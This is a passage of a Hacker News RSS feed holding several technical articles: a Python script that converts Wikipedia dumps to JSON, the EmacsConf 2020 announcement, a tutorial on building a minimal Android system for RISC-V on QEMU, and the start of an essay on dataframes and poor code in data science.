                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
            <span>else</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>strip</span><span>(</span><span>'['</span><span>).</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>
</code></pre></div></div>

<p>These functions worked-ish. You might notice the carat <code>^</code> in the curly function. This told it to match anything except another open curly bracket. This forced it to find the
innermost nested curly brackets. Again, this mostly worked, but it failed a few times and I gave up trying to figure out why. The square brackets are a bit different, as
they tend not to be nested but the inner syntax could be several different things. I opted for the simplest possible way and even so, it missed a few things. No idea why.</p>

<h2 id="attempt-15---literal-evals">Attempt 1.5 - Literal Evals</h2>

<p>I suppose I should rewind and give some context. Wikipedia dump files are effing huge. Even with 32GB of RAM on my desktop, I was rapidly running out of memory just 
loading one chunk at a time. So that meant I had to read each file line by line. Like so:</p>

<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
        <span>line</span> <span>=</span> <span>literal_eval</span><span>(</span><span>f'"""</span><span>{</span><span>line</span><span>}</span><span>"""'</span><span>)</span>  <span># this works... sometimes
</span>        <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article
</span>            <span>article</span> <span>=</span> <span>''</span>
        <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>            <span>article</span> <span>+=</span> <span>line</span>
</code></pre></div></div>

<p>This works great for just reading the thing one at a time. One consistency in the Wikipedia dumps is that every page starts and ends with <code>&lt;page&gt;</code> and <code>&lt;/page&gt;</code> respectively.
This served as a great demarcation. So I tried to handle the unicode literals as they were coming in with <a href="https://www.kite.com/python/docs/ast.literal_eval">ast.literal_eval</a>. 
Spoiler: It worked. A little bit. This function frequently bombs out for various reasons.</p>

<h2 id="attempt-2---existing-parsers">Attempt 2 - Existing Parsers</h2>

<p>I finally gave up on manually parsing WikiMedia Text and found some extant parsers. First up is <a href="https://pypi.org/project/wikitextparser/">wikitextparser</a> which, as of this writing, is actively maintained.
Second up was the simple <a href="https://pypi.org/project/html2text/">html2text</a> which got some of the stuff the first missed. These premade parsers are great in that they 
don’t require me to use any of my own brain power! They are, however, far slower than my regex replace functions. It can’t be avoided, though.</p>

<p>So now my output looks more like this:</p>

<div><div><pre><code><span>[</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"4413617"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"The Samajtantrik Sramik Front is a national trade union federation in Bangladesh. It is affiliated with the World Federation of Trade Unions..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Samajtantrik Sramik Front"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"2618"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"Aeacus (; also spelled Eacus; Ancient Greek: </span><span>\u</span><span>0391</span><span>\u</span><span>1f30</span><span>\u</span><span>03b1</span><span>\u</span><span>03ba</span><span>\u</span><span>03cc</span><span>\u</span><span>03c2 Aiakos or Aiacos) was a mythological king of the island of Aegina..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Aeacus"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"3201"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"[[File:Global_Temperature_And_Forces.svg|thumb|upright=1.35|right|Observed temperature from NASA. vs the 1850</span><span>\u</span><span>20131900 average used by the IPCC as a pre- industrial baseline.. The primary driver for increased global temperatures in the industrial era is human activity, with natural forces adding variability. Figure 3.1 panel 2, Figure 3.3 panel 5.]] Attribution of recent climate change is the "</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Attribution of recent climate change"</span><span>
 </span><span>},</span><span>
</span><span>]</span><span>
</span></code></pre></div></div>

<p>It’s much cleaner and moving in the right direction but I still have to figure out the literal eval reliably and a few square brackets are making it through as well. 
These premade parsers are far slower but one advantage of cleaning up Wikipedia articles is that they end up far smaller without the markup. If you just want the accumulated 
knowledge in plain text format, it ends up being a fraction of the size.</p>



<p>I can tolerate a few aberrations here and there but the perfectionist in me wants to do better. Anyways, here’s my script as it stands today:</p>

<div><div><pre><code><span>import</span> <span>re</span>
<span>import</span> <span>os</span>
<span>import</span> <span>json</span>
<span>from</span> <span>uuid</span> <span>import</span> <span>uuid4</span>
<span>import</span> <span>gc</span>
<span>from</span> <span>html2text</span> <span>import</span> <span>html2text</span> <span>as</span> <span>htt</span>
<span>import</span> <span>wikitextparser</span> <span>as</span> <span>wtp</span>


<span>archive_dir</span> <span>=</span> <span>'d:/WikipediaArchive/'</span>
<span>dest_dir</span> <span>=</span> <span>'D:/enwiki20201020/'</span>
<span>chars_per_file</span> <span>=</span> <span>40</span> <span>*</span> <span>1000</span> <span>*</span> <span>1000</span>  <span># create a consistently sized chunk (~40MB each)
</span>

<span>def</span> <span>dewiki</span><span>(</span><span>text</span><span>):</span>
    <span>text</span> <span>=</span> <span>wtp</span><span>.</span><span>parse</span><span>(</span><span>text</span><span>).</span><span>plain_text</span><span>()</span>
    <span>text</span> <span>=</span> <span>htt</span><span>(</span><span>text</span><span>)</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>'\s+'</span><span>,</span> <span>' '</span><span>,</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
    

<span>def</span> <span>analyze_chunk</span><span>(</span><span>text</span><span>):</span>
    <span>try</span><span>:</span>
        <span>if</span> <span>'&lt;redirect title="'</span> <span>in</span> <span>text</span><span>:</span>  <span># this is not the main article
</span>            <span>return</span> <span>None</span>
        <span>else</span><span>:</span>
            <span>title</span> <span>=</span> <span>text</span><span>.</span><span>split</span><span>(</span><span>'&lt;title&gt;'</span><span>)[</span><span>1</span><span>].</span><span>split</span><span>(</span><span>'&lt;/title&gt;'</span><span>)[</span><span>0</span><span>]</span>
            <span>if</span> <span>':'</span> <span>in</span> <span>title</span><span>:</span>  <span># this is a talk, category, or other (not a real article)
</span>                <span>return</span> <span>None</span>
        <span>serial</span> <span>=</span> <span>text</span><span>.</span><span>split</span><span>(</span><span>'&lt;id&gt;'</span><span>)[</span><span>1</span><span>].</span><span>split</span><span>(</span><span>'&lt;/id&gt;'</span><span>)[</span><span>0</span><span>]</span>
        <span>content</span> <span>=</span> <span>text</span><span>.</span><span>split</span><span>(</span><span>'&lt;/text'</span><span>)[</span><span>0</span><span>].</span><span>split</span><span>(</span><span>'&lt;text'</span><span>)[</span><span>1</span><span>].</span><span>split</span><span>(</span><span>'&gt;'</span><span>,</span> <span>maxsplit</span><span>=</span><span>1</span><span>)[</span><span>1</span><span>]</span>
        <span>content</span> <span>=</span> <span>dewiki</span><span>(</span><span>content</span><span>)</span>
        <span>return</span> <span>{</span><span>'title'</span><span>:</span> <span>title</span><span>,</span> <span>'text'</span><span>:</span> <span>content</span><span>,</span> <span>'id'</span><span>:</span> <span>serial</span><span>}</span>
    <span>except</span><span>:</span>
        <span>return</span> <span>None</span>


<span>def</span> <span>save_data</span><span>(</span><span>data</span><span>):</span>
    <span>if</span> <span>len</span><span>(</span><span>data</span><span>)</span> <span>==</span> <span>0</span><span>:</span>
        <span>return</span>
    <span>filename</span> <span>=</span> <span>dest_dir</span> <span>+</span> <span>str</span><span>(</span><span>uuid4</span><span>())</span> <span>+</span> <span>'.json'</span>
    <span>print</span><span>(</span><span>'Saving:</span><span>\t</span><span>'</span><span>,</span> <span>filename</span><span>)</span>
    <span>with</span> <span>open</span><span>(</span><span>filename</span><span>,</span> <span>'w'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>outfile</span><span>:</span>
        <span>json</span><span>.</span><span>dump</span><span>(</span><span>data</span><span>,</span> <span>outfile</span><span>,</span> <span>sort_keys</span><span>=</span><span>True</span><span>,</span> <span>indent</span><span>=</span><span>1</span><span>)</span>


<span>def</span> <span>main</span><span>(</span><span>file</span><span>):</span>
    <span>print</span><span>(</span><span>file</span><span>)</span>
    <span>outdata</span> <span>=</span> <span>list</span><span>()</span>
    <span>article</span> <span>=</span> <span>''</span>
    <span>total_len</span> <span>=</span> <span>0</span>
    <span>with</span> <span>open</span><span>(</span><span>archive_dir</span> <span>+</span> <span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
        <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
            <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article begins
</span>                <span>article</span> <span>=</span> <span>''</span>
            <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>                <span>doc</span> <span>=</span> <span>analyze_chunk</span><span>(</span><span>article</span><span>)</span>
                <span>if</span> <span>doc</span><span>:</span>
                    <span>outdata</span><span>.</span><span>append</span><span>(</span><span>doc</span><span>)</span>
                    <span>total_len</span> <span>+=</span> <span>len</span><span>(</span><span>doc</span><span>[</span><span>'text'</span><span>])</span>
                    <span>if</span> <span>total_len</span> <span>&gt;=</span> <span>chars_per_file</span><span>:</span>
                        <span>save_data</span><span>(</span><span>outdata</span><span>)</span>
                        <span>outdata</span> <span>=</span> <span>list</span><span>()</span>
                        <span>total_len</span> <span>=</span> <span>0</span>
            <span>else</span><span>:</span>
                <span>article</span> <span>+=</span> <span>line</span>
    <span>save_data</span><span>(</span><span>outdata</span><span>)</span>

    
<span>if</span> <span>__name__</span> <span>==</span> <span>'__main__'</span><span>:</span>
    <span>for</span> <span>file</span> <span>in</span> <span>os</span><span>.</span><span>listdir</span><span>(</span><span>archive_dir</span><span>):</span>
        <span>if</span> <span>'bz2'</span> <span>in</span> <span>file</span><span>:</span>
            <span>continue</span>
        <span>main</span><span>(</span><span>file</span><span>)</span>
        <span>gc</span><span>.</span><span>collect</span><span>()</span>
</code></pre></div></div>

<p>It’s not the most elegant solution but for just over 100 lines of code, it will parse almost all of Wikipedia and save it to 40MB chunks of JSON.
Running this script looks like the following:</p>

<div><div><pre><code><span>(</span>base<span>)</span> C:<span>\O</span>fflineWikipedia&gt;python jsonify_wikipedia.py</code></pre></div></div></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html">https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html</a></em></p>]]>
            </description>
            <link>https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25238316</guid>
            <pubDate>Sat, 28 Nov 2020 16:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Emacs Conference 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25238266">thread link</a>) | @dangom
<br/>
November 28, 2020 | https://emacsconf.org/2020/ | <a href="https://web.archive.org/web/*/https://emacsconf.org/2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">



<div id="pagebody">







<div id="content" role="main">
<p>EmacsConf 2020 | Online Conference | <strong>November 28 and 29, 2020</strong><br>
<a href="https://emacsconf.org/i/emacsconf-logo1-256.png"><img src="https://emacsconf.org/i/emacsconf-logo1-256.png" width="256" height="256" alt="EmacsConf logo"></a><br>
<a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> | <a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> | <a href="https://emacsconf.org/2020/planning/">Planning</a> |
<a href="https://emacsconf.org/conduct/">Code of Conduct</a></p>

<p>EmacsConf is the conference about the joy of Emacs, Emacs Lisp, and
memorizing key sequences.</p>

<p>EmacsConf 2020 will be on November 28 (Sat) and November 29 (Sun),
2020 from 9am-5pm Toronto/EST time; equivalently, 6am-2pm PST,
2pm-10pm UTC, 3pm-11pm Zurich/CET.</p>

<p>We are holding EmacsConf 2020 as a virtual (online) conference again
this year, especially now, given the current state of the world with
the ongoing global pandemic. We remain fully committed to freedom, and
we will continue using our infrastructure and streaming setup
consisting entirely of <a href="https://www.gnu.org/philosophy/free-sw.html">free software</a>, much like the last
EmacsConf. Check out the <a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> and
<a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> for more details.</p>

<h2>Watching</h2>

<p>On November 28 and 29 you will be able to watch the livestreams via
<a href="https://live.emacsconf.org/">https://live.emacsconf.org</a>, which also has details on how to watch the
streams using media players that support streaming (like mpv and VLC).</p>

<p>We'll record the conference and post the videos and links on the
individual talk pages. In the meantime, please enjoy
<a href="https://emacsconf.org/2019/talks/">last year's talks</a>.</p>

<h2>Participating</h2>

<p>For audience questions specifically, we will be experimenting with
using a collaboratively-editable Etherpad as the primary means of
collecting audience questions.
<a href="https://etherpad.wikimedia.org/p/emacsconf-2020">https://etherpad.wikimedia.org/p/emacsconf-2020</a> If, however, you are
unable to access the pad to add your question(s), we will still try to
take questions from our IRC channel (<code>#emacsconf</code> on
<code>chat.freenode.net</code>), and ask one or two volunteers to kindly add
questions from that channel to the pad on behalf of folks who are not
able to or prefer not to use the web-based questions pad. To make your
question easier to spot, please start it with <strong>Q:</strong>.</p>

<p>Come hang out with us in <code>#emacsconf</code> on <code>chat.freenode.net</code>.  You can
join the chat using <a href="ircs://chat.freenode.net:6697/emacsconf">your favourite IRC client</a>, or by visiting
<a href="https://chat.emacsconf.org/">chat.emacsconf.org</a> in your web browser, a self-hosted instance
of <a href="https://thelounge.chat/">The Lounge</a> free software web IRC client for EmacsConf.</p>

<h2>Updates</h2>

<p>Be sure to subscribe to our mailing list
<a href="https://lists.gnu.org/mailman/listinfo/emacsconf-discuss">emacsconf-discuss</a> for discussion and
announcements about the conference.</p>

</div>







</div>



</div></div>]]>
            </description>
            <link>https://emacsconf.org/2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25238266</guid>
            <pubDate>Sat, 28 Nov 2020 15:54:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A minimal Android system for RISC-V]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25238101">thread link</a>) | @homarp
<br/>
November 28, 2020 | https://plctlab.github.io/aosp/create-a-minimal-android-system-for-riscv.html | <a href="https://web.archive.org/web/*/https://plctlab.github.io/aosp/create-a-minimal-android-system-for-riscv.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        

<p>Chen Wang, 2020.11.24</p>

<p>After a period of hard work, we can now run an Android “minimal system” on QEMU of RISC-V.</p>

<p>The following is a brief summary of the current work. Although the road ahead is still long, there is something to have a look.</p>

<h2 id="1-requirement-analysis">1. Requirement analysis</h2>

<p>The full name of our project is “AOSP for RISC-V”, and all the source code is currently opened on github: <a href="https://github.com/aosp-riscv">https://github.com/aosp-riscv</a>. The ultimate goal of our project is to port Android on RISC-V. Of course, this goal is huge.</p>

<p>But in the short term, we still have a small goal, which is described in one sentence: <code>based on the RISC-V platform, realize the kernel part of Android running on QEMU, and run the Android Shell</code>.</p>

<p>Based on the above objectives, the specific analysis is to realize a minimal Android system. The meaning of “minimal system” here is the so-called “bootable unix-style command line operating system”. In the traditional sense, a complete “minimal system” is described on the left side of the figure below. From bottom to top, the bottom is the hardware (note: hardware is not part of our “minimal system”). The first layer of software running on the hardware is the “Operating System Kernel”, and upon the OS kernel is the <a href="https://en.wikipedia.org/wiki/C_standard_library">“C library”</a>. Based on the C Library, we can build a minimal file system, which is essentially a bunch of command-line tools. These command-line tools must include at least a <a href="https://en.wikipedia.org/wiki/Init">“init”</a>, which is used to start the basic login shell in cooperation with the kernel, and one <a href="https://en.wikipedia.org/wiki/Unix_shell">“Shell”</a> is used to interact with users and call other tools and programs. With this “minimal system”, our big goal has a foundation.</p>

<p><img src="https://plctlab.github.io/aosp/diagrams/mini-system.png" alt="a minimal unix-style os"></p>

<p>Through the investigation of AOSP, I roughly summarized the work we need to achieve as follows:</p>

<ul>
  <li>Hardware part: Here we first use QEMU for RISC-V to simulate.</li>
  <li>OS Kernel: The kernel of Android uses Linux, of course, it has some patches of its own.</li>
  <li>C Library: Android has its own C library, which is bionic. It differs from the GNU C library (glibc) in that it is designed for devices with low memory and processor capabilities and running on Linux. It is released under the BSD license, rather than using the GNU public license like glibc.</li>
  <li>Root filesystem: Android has its own complex file system organization. As the goal of our experiment, what we need is the most streamlined and smallest file system. There is no need to transplant the complete Android system over, so I chose toybox to implement our various kind of command line tool. Someone may ask why we don’t use the more famous busybox. The reason is still related to the software license. Busybox uses GPL, while toybox uses BSD, which is more in line with Android’s appetite. Therefore, toybox is included in the source tree of AOSP, but busybox is not. In addition, I need to mention, because the implementation of toybox is very simple, the shell that provided by toybox does not work properly. Fortunately, Android already has its own official Shell, which is mksh, so we use mksh directly.</li>
</ul>

<h2 id="2-introduction-to-porting-work">2. Introduction to porting work</h2>

<p>The above talked about what needs to be done in the overall porting work. In fact, there are still many details in the specific implementation. Since our final goal (to transplant AOSP as a whole to RISC-V) is far from being achieved, I will briefly sort out what I have achieved so far, just for memo:</p>

<ul>
  <li>Operating platform (hardware): currently adopt QEMU temporarily.</li>
  <li>AOSP version: tag based on <code>android-10.0.0_r39</code>.</li>
  <li>Toolchain environment: building of AOSP has been completely migrated to LLVM/CLANG, but GNU tools are still used in linking. Since the prebuild tool chain that comes with AOSP does not support RISC-V, I have to build my own LLVM/Clang and GNU-tools.</li>
  <li>Kernel porting: the kernel version I used tag <code>android-5.4-stable</code> for andorid common repository plus tag <code>android11-release</code> for configs repository.</li>
  <li>The porting of the BIONIC library, as mentioned earlier, is based on the tag <code>android-10.0.0_r39</code> too. Considering the requirements in first phase, only the static library of libc is implemented, the dynamic library of libc is not implemented, neither for libm/libdl/libstdc++/linker till now (but I will handle them soon later). In other words, the following executable programs such as toybox and mksh are statically linked. libc is the most important part of bionic, and the composition is quite complex. The main components and the dependencies between them are briefly summarized in following diagram:</li>
</ul>

<p><img src="https://plctlab.github.io/aosp/diagrams/bionic-libc.png" alt="bionic libc"></p>

<ul>
  <li>toybox: As mentioned earlier, it is based on tag <code>android-10.0.0_r39</code>, but with a lot of tailoring. Because the toybox in Android includes many Android-specific features, such as SELinux and encryption, etc. In order not to involve too much effort in current phase, I disabled these functions and only retain some basic common functions.</li>
  <li>mksh: The Shell looks relatively simple, just make sure there is no problem with the compilation.</li>
  <li>There is also a big work involved in the construction of the build system. I did not use the native Soong system that comes with AOSP, because in the pre-research process, I found that it is not easy to add a new ARCH from scrach in the existing AOSP build system (i.e. to use the traditional lunch + m). AOSP’s building system is too complicated and mature for existing ARCH that supported, but it is not friendly to latecomers. In order to reduce the risk and focus on the key areas in advance, I chose to use make and rewrite the makefiles for modules (bionic/toybox/mksh) that need to be ported. Of course, we still need to find a chance to move to AOSP Soong later, just let’s do it later.</li>
</ul>

<h2 id="3-steps-to-make-this-minimal-system">3. Steps to make this minimal system</h2>

<p>After some work, the above small goal has been initially completed, and at least one of the “minimal Android systems” we defined above can be launched on QEMU. The related porting and modification have been opened on github. Allow me brief following steps and you are welcomed to have a try and test, submit PR, or directly participate in our AOSP porting work.</p>

<h3 id="31-environmental-preparation">3.1 Environmental preparation</h3>

<p>The experiment is based on Ubuntu 20.04 LTS</p>

<div><div><pre><code>$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description: Ubuntu 20.04 LTS
Release: 20.04
Codename: focal
</code></pre></div></div>

<p>The software that needs to be installed in advance is as follows:</p>

<div><div><pre><code>$ sudo apt install autoconf automake autotools-dev curl libmpc-dev libmpfr-dev libgmp-dev \
                  gawk build-essential bison flex texinfo gperf libtool patchutils bc \
                  zlib1g-dev libexpat-dev git \
                  libglib2.0-dev libfdt-dev libpixman-1-dev \
                  libncurses5-dev libncursesw5-dev
</code></pre></div></div>

<p>Then create a working directory <code>riscv64-linux</code>, the following operations are performed under this directory.</p>

<div><div><pre><code>$ mkdir riscv64-linux
$ cd riscv64-linux
</code></pre></div></div>

<h4 id="311-building-gnu-toolchain">3.1.1 Building GNU toolchain</h4>

<p>Download source code</p>

<div><div><pre><code>$ git clone https://github.com/riscv/riscv-gnu-toolchain
</code></pre></div></div>

<p>Enter the source directory:</p>



<p>Note that the main repository of clone above does not contain the contents of the sub-repositories, so you need to continue to update the sub-repositories. Note that the sub-repository of qemu is excluded first, because the complete download of qemu is too large; second, qemu is actually not needed for the toolchain compilation itself.</p>

<div><div><pre><code>$ git rm qemu
$ git submodule update --init --recursive
</code></pre></div></div>

<p>Wait patiently for the sub-repository download to complete.</p>

<p>Note that due to I want to install the tools to <code>/opt/riscv64</code>, so sudo is required for make.</p>

<div><div><pre><code>$ ./configure --prefix=/opt/riscv64
$ sudo make linux -j $(nproc)
</code></pre></div></div>

<p>Export the installation path of the toolchain. You can also write to the <code>.bashrc</code> file.</p>

<div><div><pre><code>export PATH="$PATH:/opt/riscv64/bin"
</code></pre></div></div>

<p>Test whether the toolchain is installed successfully.</p>

<div><div><pre><code>$ riscv64-unknown-linux-gnu-gcc -v
</code></pre></div></div>

<p>Output similar to the following shows that the toolchain is compiled and installed normally.</p>

<div><div><pre><code>Using built-in specs.
COLLECT_GCC=riscv64-unknown-linux-gnu-gcc
COLLECT_LTO_WRAPPER=/opt/riscv64/libexec/gcc/riscv64-unknown-linux-gnu/10.1.0/lto-wrapper
Target: riscv64-unknown-linux-gnu
Configured with: /home/u/ws/riscv64-linux/riscv-gnu-toolchain/riscv-gcc/configure --target=riscv64-unknown-linux-gnu --prefix=/opt/riscv64 --with-sysroot= /opt/riscv64/sysroot --with-system-zlib --enable-shared --enable-tls --enable-languages=c,c++,fortran --disable-libmudflap --disable-libssp --disable-libquadmath- -disable-libsanitizer --disable-nls --disable-bootstrap --src=.././riscv-gcc --disable-multilib --with-abi=lp64d --with-arch=rv64imafdc --with-tune =rocket'CFLAGS_FOR_TARGET=-O2 -mcmodel=medlow''CXXFLAGS_FOR_TARGET=-O2 -mcmodel=medlow'
Thread model: posix
Supported LTO compression algorithms: zlib
gcc version 10.1.0 (GCC)
</code></pre></div></div>

<h4 id="312-build-llvmclang-tool-chain">3.1.2 Build LLVM/Clang tool chain</h4>

<p>Make sure to return to the working directory <code>riscv64-linux</code> first.</p>

<p>After updating Ubuntu 20.04 LTS to the latest state, the software requirements for building llvm/clang should have been supported by default. Other tools needed in the compilation process are basically available on Ubuntu. If something is missed, please install it yourself.</p>

<p>Download the source code of llvm. The official source code repository is at github: <a href="https://github.com/llvm/llvm-project">https://github.com/llvm/llvm-project</a>.</p>

<div><div><pre><code>$ git clone https://github.com/llvm/llvm-project
</code></pre></div></div>

<p>After downloading, enter the root directory of the source code repository and check out the corresponding version. I choose thhe official release version <code>10.0.1-final</code> and switch to the <code>10.x</code> branch.</p>

<div><div><pre><code>$ cd llvm-project/
$ git checkout release/10.x
$ mkdir build
$ cd build
$ cmake -G "Unix Makefiles" \
-DCMAKE_BUILD_TYPE=Release \
-DCMAKE_INSTALL_PREFIX=../install \
-DLLVM_TARGETS_TO_BUILD="RISCV" \
-DLLVM_ENABLE_PROJECTS="clang;libcxx;libcxxabi" \
-DLLVM_DEFAULT_TARGET_TRIPLE="riscv64-unknown-linux-gnu" \
../llvm
$ make -j $(nproc)
$ make install
</code></pre></div></div>

<p>Simply check the results of the installation.</p>

<div><div><pre><code>$ ls ../install/ -l
total 20
drwxrwxr-x 2 u u 4096 October 9 11:37 bin
drwxrwxr-x 7 u u 4096 Oct 9 11:37 include
drwxrwxr-x 4 u u 4096 October 9 11:37 lib
drwxrwxr-x 2 u u 4096 October 9 11:37 …</code></pre></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://plctlab.github.io/aosp/create-a-minimal-android-system-for-riscv.html">https://plctlab.github.io/aosp/create-a-minimal-android-system-for-riscv.html</a></em></p>]]>
            </description>
            <link>https://plctlab.github.io/aosp/create-a-minimal-android-system-for-riscv.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25238101</guid>
            <pubDate>Sat, 28 Nov 2020 15:29:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dataframes and the proliferation of bad code in data science]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25237677">thread link</a>) | @soumendra
<br/>
November 28, 2020 | https://databiryani.com/dataframes/machine-learning/data-science/2020/11/28/dataframes-and-the-proliferation-of-bad-code-in-data-science.html | <a href="https://web.archive.org/web/*/https://databiryani.com/dataframes/machine-learning/data-science/2020/11/28/dataframes-and-the-proliferation-of-bad-code-in-data-science.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <ul>
<li><a href="#why-good-code-is-important">Why good code is important?</a></li>
<li><a href="#why-data-scientists-write-bad-code">Why data scientists write bad code?</a></li>
<li><a href="#cult-of-kaggle">Cult of Kaggle</a></li>
<li><a href="#state-mismanagement">State Mismanagement</a>
<ul>
<li><a href="#what-is-state-mismanagement">What is state mismanagement?</a></li>
<li><a href="#why-state-management-is-important">Why state management is important?</a></li>
<li><a href="#state-mismanagement-with-dataframes">State mismanagement with DataFrames</a></li>
</ul>
</li>
<li><a href="#poorly-abstracted-codebases">Poorly abstracted codebases</a>
<ul>
<li><a href="#consequences">Consequences</a></li>
</ul>
</li>
<li><a href="#how-to-do-better">How to do better?</a></li>
<li><a href="#acknowledgments">Acknowledgments</a></li>
<li><a href="#discuss-this-post">Discuss this post</a></li>
</ul>

<p>Developing a solution with machine learning is equal parts science and software engineering. The science of it is important, certainly, but your success will be equally dependant, if not more, on how you engineer your solution. Given the abundance of libraries that implement state-of-the-art algorithms for easy consumption and the data (and pre-trained models) to go with them, your ability to engineer your code well is the critical component for your success.</p>

<blockquote>
  <p>Between two somewhat comparable data scientists, the one with better software engineering skills is more likely to succeed in a machine learning project than the one with better machine learning skills.</p>
</blockquote>

<p>The reasons are twofold. First, the barrier to entry to build effective models is getting lower as many high-level libraries make it increasingly easier to solve a wide variety of problems in machine learning and deep learning. State-of-the-art results become available (as pre-trained models) in a matter of weeks after publication. There is always a tutorial around the corner showing you how to tackle your ml/dl problems with freely available tools.</p>

<p>Secondly, the data science culture is a mess, leading to a focus on model performance rather than real-life performance (which can be measured only after deployment). For data scientists, the impetus is more on getting the experiments right, quickly; whatever it takes to achieve that! But the value from data science/machine learning projects comes from their deployment, not modeling experiments.</p>

<blockquote>
  <p>A more effective data scientist is the one who deploys more often, not the one with better model scores.</p>
</blockquote>

<p>The culture around this is changing though, and we hope to be a part of that change.</p>



<p>In this issue, we focus on our perception of the core reasons coming from working with and educating a lot of data scientists over the years.</p>

<p>Primarily, we think the problem arises from how the <strong>Cult of Kaggle</strong> (not in the way you think) promoted a habit of <strong>State Mismanagement</strong>, which results in <strong>Poorly abstracted codebases</strong> hurting data science projects.</p>



<p>Kaggle is a competition platform for machine learning and deep learning, and a lot of people complain that Kaggle is not real data science. That it sets up wrong expectations with its super-clean datasets neatly divided into train/test-sets, freeing the data scientist to focus only on the modeling problem and not have to worry about data issues.</p>

<p>While this is a valid criticism, we believe that there is a place and utility for such a platform. Given the fantastic community that has come up around Kaggle, it is now one of the most popular platforms for new (and old) data scientists to hone their craft.</p>

<p>The problem is the outsized role Kaggle plays in the education of data scientists. Given a new problem, most will try to get to those train/test-sets (and possibly a validation-set thrown in) and try to get a model that “works” in the <a href="https://en.wikipedia.org/wiki/Empirical_risk_minimization">empirical risk management</a> sense (on the test-set, of course).</p>

<blockquote>
  <p>For data scientists, the impetus is more on getting the experiments right, quickly; whatever it takes to achieve that! But the value from data science/machine learning projects comes from their deployment, not modelling experiments.</p>
</blockquote>

<p>This results in code that has bad abstractions. This code is usually propped up with all sorts of hacky engineering practices and put into production.</p>

<p>But if we have to put our finger on one bad abstraction that is pervasive in the data science (engineering) universe and responsible for much of the bad code, it will be state mismanagement.</p>



<p>DataFrames are one of the most ubiquitous and useful data structures, no matter what stack you are using, and they are also very useful to see if a codebase is likely to be bad.</p>

<blockquote>
  <p>If most of the functions in your codebase accept dataframes as input and return dataframes as output, you are likely not modelling the entities correctly and writing hacky code to patch things.</p>
</blockquote>

<h2 id="what-is-state-mismanagement">
What is state mismanagement?</h2>

<p>If you are coming from a traditional programming background, having done webapps or backends or any of the myriad things we do when we code, you’ll be used to creating some kind of abstraction to model the entities involved in your code. A customer, a purchase, a geographic location - any of these could be an entity of interest given the problem we have.</p>

